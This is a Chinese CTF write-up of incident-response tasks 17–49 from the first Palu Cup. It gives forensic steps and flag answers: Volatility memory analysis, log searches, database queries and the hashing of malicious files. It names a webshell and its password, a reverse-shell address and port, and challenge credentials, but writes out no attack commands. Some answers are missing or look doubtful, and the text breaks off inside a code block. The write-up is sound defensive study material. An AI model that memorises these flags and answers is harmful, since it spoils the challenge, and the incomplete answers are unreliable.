+<p>我们搜vim的话，有一个hacktext，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104039978.png" alt="image-20240422104039978"></p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104107182.png" alt="image-20240422104107182"></p>
+<blockquote>
+<p>flag:flag{hi_palu_f10g}</p>
+</blockquote>
+<h2 id="应急响应-17"><a href="#应急响应-17" class="headerlink" title="应急响应-17"></a>应急响应-17</h2><p><strong>题目要求：</strong><br>请提交运维服务器上的恶意文件md5（小写32位md5值）。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>jump上面的命令执行很少，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104508097.png" alt="image-20240422104508097"></p>
+<p>有个helloworld<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104629194.png" alt="image-20240422104629194"></p>
+<blockquote>
+<p>0fca0f847a45401c878d7a5303ddc1f8</p>
+</blockquote>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104730373.png" alt="image-20240422104730373"></p>
+<h2 id="应急响应-18"><a href="#应急响应-18" class="headerlink" title="应急响应-18"></a>应急响应-18</h2><p><strong>题目要求：</strong><br>提交恶意文件的恶意函数。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(恶意函数)]</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422105456764.png" alt="image-20240422105456764"></p>
+<p>sftp不好用，直接python开一个下载一下<br>托ida看一下，<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422105643050.png" alt="image-20240422105643050"> begingame()</p>
+<blockquote>
+<p>flag:ddd0599cda1fc289a617db148d75383b</p>
+</blockquote>
+<h2 id="应急响应-19"><a href="#应急响应-19" class="headerlink" title="应急响应-19"></a>应急响应-19</h2><p><strong>题目要求：</strong><br>请提交攻击者恶意注册的恶意用户条数。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(x)]</p>
+<p>根据文件找到数据库为mysql01，select * from pre_ucenter_members ;</p>
+<p>查一下用户，是kongzi的这些<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422141428970.png" alt="image-20240422141428970"></p>
+<blockquote>
+<p>flag : 10</p>
+</blockquote>
+<h2 id="应急响应-20"><a href="#应急响应-20" class="headerlink" title="应急响应-20"></a>应急响应-20</h2><p><strong>题目要求：</strong><br>请提交对博客系统的第一次扫描时间。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]</p>
+<p>博客的映射端口为80，</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422110228519.png" alt="image-20240422110228519"></p>
+<p>筛选一下，我可以看到扫描的日志，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422110536928.png" alt="image-20240422110536928"></p>
+<p>w攻击事件中也可以看到，拦截了3.6k,就是扫描了，其他的也有一些扫描，但不是在blog的。</p>
+<blockquote>
+<p>2024-04-16 21:03:46</p>
+</blockquote>
+<h2 id="应急响应-21"><a href="#应急响应-21" class="headerlink" title="应急响应-21"></a>应急响应-21</h2><p><strong>题目要求：</strong><br>提交攻击者下载的文件。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx.xxx]</p>
+<p>在html目录下有一个upload.zip，日志中也可以看到</p>
+<blockquote>
+<p>flag:upload.zip</p>
+</blockquote>
+<h2 id="应急响应-22"><a href="#应急响应-22" class="headerlink" title="应急响应-22"></a>应急响应-22</h2><p><strong>题目要求：</strong><br>请提交攻击者第一次下载服务器文件的时间。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xx/Apr/2024:xx:xx:xx]</p>
+<p>[2024/04/16/21:03:46]</p>
+<p>我们将access5的日志下载下来看一下</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142210985.png" alt="image-20240422142210985"></p>
+<p>然后搜一下upload。zip<br>192.168.20.121:80 192.168.20.123 - - [16/Apr/2024:09:03:52 -0400] “GET /upload.zip HTTP/1.1” 206 8387 “-“ “Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0”</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142301560.png" alt="image-20240422142301560"></p>
+<blockquote>
+<p>flag:[16/Apr/2024:09:03:52]</p>
+</blockquote>
+<h2 id="应急响应-23"><a href="#应急响应-23" class="headerlink" title="应急响应-23"></a>应急响应-23</h2><p><strong>题目要求：</strong><br>请提交攻击者留下的冰蝎马的文件名称。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]<br>筛选一下时间，可以看到一个</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111019091.png" alt="image-20240422111019091"></p>
+<p>jump里面也有</p>
+<blockquote>
+<p>flag:nidewen.php</p>
+</blockquote>
+<h2 id="应急响应-24"><a href="#应急响应-24" class="headerlink" title="应急响应-24"></a>应急响应-24</h2><p><strong>题目要求：</strong><br>提交冰蝎的链接密码。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx]</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111427463.png" alt="image-20240422111427463"></p>
+<p>直接让我的好大哥口算一下,就是文件名</p>
+<blockquote>
+<p>flag:nidewen</p>
+</blockquote>
+<h2 id="应急响应-25"><a href="#应急响应-25" class="headerlink" title="应急响应-25"></a>应急响应-25</h2><p><strong>题目要求：</strong><br>提交办公区存在的恶意用户名。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx]</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142549715.png" alt="image-20240422142549715"></p>
+<p>上来就可以看到，</p>
+<blockquote>
+<p>flag:hacker</p>
+</blockquote>
+<h2 id="应急响应-26"><a href="#应急响应-26" class="headerlink" title="应急响应-26"></a>应急响应-26</h2><p><strong>题目要求：</strong><br>提交恶意用户密码到期时间。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[2024/xxx/xxx/xxx:xxx:xxx]</p>
+<p>进去输入net user hacker即可</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240419144854185.png" alt="image-20240419144854185"></p>
+<blockquote>
+<p>flag: 2024/15/18/21:40:37</p>
+</blockquote>
+<h2 id="应急响应-27"><a href="#应急响应-27" class="headerlink" title="应急响应-27"></a>应急响应-27</h2><p><strong>题目要求：</strong><br>请对办公区留存的镜像取证并指出内存疑似恶意进程。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 pslist</code><br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142930126.png" alt="image-20240422142930126"></p>
+<blockquote>
+<p>.hack.ex</p>
+</blockquote>
+<h2 id="应急响应-28"><a href="#应急响应-28" class="headerlink" title="应急响应-28"></a>应急响应-28</h2><p><strong>题目要求：</strong><br>请指出该员工使用的公司OA平台的密码。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>查一下pass相关file</p>
+<p><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 filescan | grep pass</code><br><code>python2 vol.py -f /root/Desktop/raw.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e296f20 -D /root/Desktop/</code></p>
+<p>两个文件，提出来<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422143146132.png" alt="image-20240422143146132"></p>
+<p>┌──(root㉿bohemian)-[~/Desktop]<br>└─# cat file.None.0xfffffa800ee5d530.dat<br>url: <a target="_blank" rel="noopener" href="http://test.oa.com/login.html">http://test.oa.com/login.html</a><br>username: liuling<br>password: liuling7541  </p>
+<blockquote>
+<p>flag:  liuling7541  </p>
+</blockquote>
+<h2 id="应急响应-29"><a href="#应急响应-29" class="headerlink" title="应急响应-29"></a>应急响应-29</h2><p><strong>题目要求：</strong><br>攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>抄的，不会，搜剪切板有<br>python2 vol.py -f /root/Desktop/raw.raw –profile=Win7SP1x64 clipboard<br>Volatility Foundation Volatility Framework 2.6.1<br>Session    WindowStation Format                         Handle Object             Data</p>
+<hr>
+<pre><code>     1 WinSta0       CF_UNICODETEXT               0x4c0397 0xfffff900c1c19c30 C:\Windows\PLA\h4ck3d!
+     1 WinSta0       CF_TEXT                          0x10 ------------------
+     1 WinSta0       0x1b01a5L              0x300000000000 ------------------
+     1 WinSta0       CF_TEXT                           0x1 ------------------
+     1 ------------- ------------------           0x1b01a5 0xfffff900c1cb2b60
+</code></pre>
+<blockquote>
+<p>flag:h4ck3d!</p>
+</blockquote>
+<h2 id="应急响应-30"><a href="#应急响应-30" class="headerlink" title="应急响应-30"></a>应急响应-30</h2><p><strong>题目要求：</strong><br>请提交该计算机中记录的重要联系人的家庭住址。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxxx]</p>
+<p>抄的，第一次知道</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145239118.png" alt="image-20240422145239118"></p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145259333.png" alt="image-20240422145259333"></p>
+<p>那么提取，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145505782.png" alt="image-20240422145505782"></p>
+<p>─# cat /root/Deskt941e0f06”&gt;&lt;c:Street&gt;秋水省雁荡市碧波区千屿山庄1号&lt;/c:Stree</p>
+<blockquote>
+<p>flag:秋水省雁荡市碧波区千屿山庄1号</p>
+</blockquote>
+<h2 id="应急响应-31"><a href="#应急响应-31" class="headerlink" title="应急响应-31"></a>应急响应-31</h2><p><strong>题目要求：</strong><br>请提交近源靶机上的恶意文件哈希。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx]</p>
+<p>近源靶机为pc2,上面有个恶意文件，打开就是<br>PS C:\Users\Administrator\Desktop\artifact&gt; certutil -hashfile .\artifact.exe md5<br>MD5 的 .\artifact.exe 哈希:<br>a7fcd0b15a080167c4c2f05063802a6e<br>CertUtil: -hashfile 命令成功完成。<br>PS C:\Users\Administrator\Desktop\artifact&gt;</p>
+<blockquote>
+<p>flag a7fcd0b15a080167c4c2f05063802a6e</p>
+</blockquote>
+<h2 id="应急响应-32"><a href="#应急响应-32" class="headerlink" title="应急响应-32"></a>应急响应-32</h2><p><strong>题目要求：</strong><br>提交恶意程序的外联地址。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxxx]</p>
+<p>这个拖到微步，没有检测到外连</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422151054884.png" alt="image-20240422151054884"><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422151302325.png" alt="image-20240422151302325"></p>
+<p>vt可以</p>
+<blockquote>
+<p>flag 101.78.63.44</p>
+</blockquote>
+<h2 id="应急响应-33"><a href="#应急响应-33" class="headerlink" title="应急响应-33"></a>应急响应-33</h2><p><strong>题目要求：</strong><br>提交攻击者使用内网扫描工具的哈希。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>吐槽一下，这到了pc，然后又回到了服务器，有点蒙圈</p>
+<p>root@debian:/usr/bin# md5sum fscan<br>1facdcd05c43ba4d37274dffc90b6d4e  fscan</p>
+<blockquote>
+<p>1facdcd05c43ba4d37274dffc90b6d4e  </p>
+</blockquote>
+<h2 id="应急响应-34"><a href="#应急响应-34" class="headerlink" title="应急响应-34"></a>应急响应-34</h2><p><strong>题目要求：</strong><br>请提交攻击者在站点上留下的后门密码。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(xxxx)]</p>
+<p>后门的话，在index.php中，<br>waf中可看到执行了命令</p>
+<blockquote>
+<p>flag 123</p>
+</blockquote>
+<h2 id="应急响应-35"><a href="#应急响应-35" class="headerlink" title="应急响应-35"></a>应急响应-35</h2><p><strong>题目要求：</strong><br>请提交攻击者在数据库留下的信息。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>还是直接用navicat连数据库比较好，命令行能翻一年<br>MySQL [ultrax]&gt; select * from pre_ucenter_vars;<br>+—————–+——-+<br>| name            | value |<br>+—————–+——-+<br>| flag{hack_palu} | 0     |<br>| noteexists      | 0     |<br>| noteexists1     | 0     |<br>+—————–+——-+<br>3 rows in set (0.001 sec)</p>
+<p>MySQL [ultrax]&gt; </p>
+<blockquote>
+<p>flag{hack_palu} </p>
+</blockquote>
+<h2 id="应急响应-36"><a href="#应急响应-36" class="headerlink" title="应急响应-36"></a>应急响应-36</h2><p><strong>题目要求：</strong><br>提交攻击者在监控服务器上留下的dcnlog地址。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx.xx.xx]</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422160601984.png" alt="image-20240422160601984"></p>
+<p>进入到zabbix的数据库，也就是数据库2，可以查到passwd查一下为原密码</p>
+<p>Admin/zabbix<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422161004820.png" alt="image-20240422161004820"></p>
+<p>在脚本中有地址</p>
+<blockquote>
+<p>palu.dcnlog.cn</p>
+</blockquote>
+<h2 id="应急响应-37"><a href="#应急响应-37" class="headerlink" title="应急响应-37"></a>应急响应-37</h2><p><strong>题目要求：</strong><br>提交监控服务器上恶意用户的上一次登录时间。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xx/xx/xx/xx:xx:xx]</p>
+<p>用户中有这个登录记录</p>
+<p>不 (2024-04-17 01:32:44)</p>
+<blockquote>
+<p>2024-04-17 01:32:44</p>
+</blockquote>
+<h2 id="应急响应-38"><a href="#应急响应-38" class="headerlink" title="应急响应-38"></a>应急响应-38</h2><p><strong>题目要求：</strong><br>提交监控服务器上遗留的反弹shell地址和端口。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx:xx]</p>
+<p>解一下base64即可</p>
+<blockquote>
+<p>154.183.110.12:7890</p>
+</blockquote>
+<h2 id="应急响应-39"><a href="#应急响应-39" class="headerlink" title="应急响应-39"></a>应急响应-39</h2><p><strong>题目要求：</strong><br>提交恶意钓鱼文件的哈希。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>pc2上有一个docx文件，应该是用了调用的</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422162222877.png" alt="image-20240422162222877"></p>
+<h2 id="应急响应-40"><a href="#应急响应-40" class="headerlink" title="应急响应-40"></a>应急响应-40</h2><p><strong>题目要求：</strong><br>提交恶意文件外连IP。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx]</p>
+<h2 id="应急响应-41"><a href="#应急响应-41" class="headerlink" title="应急响应-41"></a>应急响应-41</h2><p><strong>题目要求：</strong><br>提交被恶意文件钓鱼使用者的姓名。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx]</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422162758559.png" alt="image-20240422162758559"></p>
+<h2 id="应急响应-42"><a href="#应急响应-42" class="headerlink" title="应急响应-42"></a>应急响应-42</h2><p><strong>题目要求：</strong><br>提交攻击者留下的信息。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>z这里，我们找到jumpserver的录像，我第一次知道这东西还有录像功能<br>首先到jump的目录找到config.txt</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172534548.png" alt="image-20240422172534548"></p>
+<p>看到录像的位置</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172559581.png" alt="image-20240422172559581"></p>
+<p>然后上这里照录象</p>
+<p>/data/jumpserver/core/data/media/replay</p>
+<p>录像很多，要筛选一下，我们猜测大概在4.16-17进行的渗透<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172751520.png" alt="image-20240422172751520"></p>
+<p>在4.17有很多录像，这里注意cast的是linux录像</p>
+<p>replay是win录像<br>找到这个打的，9.3m的导出来<br><code>https://player.glyptodon.com/</code></p>
+<p>在这个网站打开，文件，看到5：11左右，可以看到写了个注册表</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172131659.png" alt="image-20240422172131659"></p>
+<blockquote>
+<p>flag:flag{2024-04-17-hi}</p>
+</blockquote>
+<h2 id="应急响应-43"><a href="#应急响应-43" class="headerlink" title="应急响应-43"></a>应急响应-43</h2><p><strong>题目要求：</strong><br>提交恶意用户数量。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(xxxx)]</p>
+<p>理论上来说，那些用户名都不算，是用户名<br>而admin这些是用户，不理解<br>那一共是49个</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422173631566.png" alt="image-20240422173631566"></p>
+<blockquote>
+<p>flag:49</p>
+</blockquote>
+<h2 id="应急响应-44"><a href="#应急响应-44" class="headerlink" title="应急响应-44"></a>应急响应-44</h2><p><strong>题目要求：</strong><br>请提交员工集体使用的密码。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>在15：02的时候，可以看到设置了密码</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422173847516.png" alt="image-20240422173847516"></p>
+<blockquote>
+<p>Network@2020</p>
+</blockquote>
+<h2 id="应急响应-45"><a href="#应急响应-45" class="headerlink" title="应急响应-45"></a>应急响应-45</h2><p><strong>题目要求：</strong><br>提交加密文件的哈希。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p>加密文件就是encode。txt<br>hash一下</p>
+<p>PS C:\Users\Administrator\Documents&gt; certutil -hashfile .\encode.txt md5<br>MD5 的 .\encode.txt 哈希:<br>dc040203e9122e89ee44ddc85058795a<br>CertUtil: -hashfile 命令成功完成。<br>PS C:\Users\Administrator\Documents&gt;</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422174044841.png" alt="image-20240422174044841"></p>
+<blockquote>
+<p>dc040203e9122e89ee44ddc85058795a</p>
+</blockquote>
+<h2 id="应急响应-46"><a href="#应急响应-46" class="headerlink" title="应急响应-46"></a>应急响应-46</h2><p><strong>题目要求：</strong><br>提交被攻击者加密的内容明文。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxxx]</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/drt-aav/">https://www.ddosi.org/drt-aav/</a></p>
+<p>这个网站给了码表，对一下就行</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422174049892.png" alt="image-20240422174049892"></p>
+<blockquote>
+<p>flag:2024ispassword</p>
+</blockquote>
+<h2 id="应急响应-47"><a href="#应急响应-47" class="headerlink" title="应急响应-47"></a>应急响应-47</h2><p><strong>题目要求：</strong><br>请提交符合基线标准的服务器数量。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[md5(xx)]</p>
+<p>不懂，我看zabbix上就一台机器<br>webserver</p>
+<blockquote>
+<p>0</p>
+</blockquote>
+<h2 id="应急响应-48"><a href="#应急响应-48" class="headerlink" title="应急响应-48"></a>应急响应-48</h2><p><strong>题目要求：</strong><br>提交办公区的恶意文件哈希。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx]</p>
+<p>在jump上面可以看到4、17上传了一个文件，但是桌面上我们并没有看到，可能就是恶意文件了</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084615143.png" alt="image-20240423084615143"></p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084729345.png" alt="image-20240423084729345"></p>
+<p>搜一下，看起来是个python的文件</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084858362.png" alt="image-20240423084858362"></p>
+<blockquote>
+<p>5232a191eb2913337e0a93b0a990f2a2</p>
+</blockquote>
+<h2 id="应急响应-49"><a href="#应急响应-49" class="headerlink" title="应急响应-49"></a>应急响应-49</h2><p><strong>题目要求：</strong><br>提交恶意回连端口。</p>
+<hr>
+<p><strong>提交格式：</strong><br>[xxx]</p>
+<p>简单py逆向了</p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085055511.png" alt="image-20240423085055511"></p>
+<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085236855.png" alt="image-20240423085236855"></p>
+<p>讲pyc到网站解一下就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 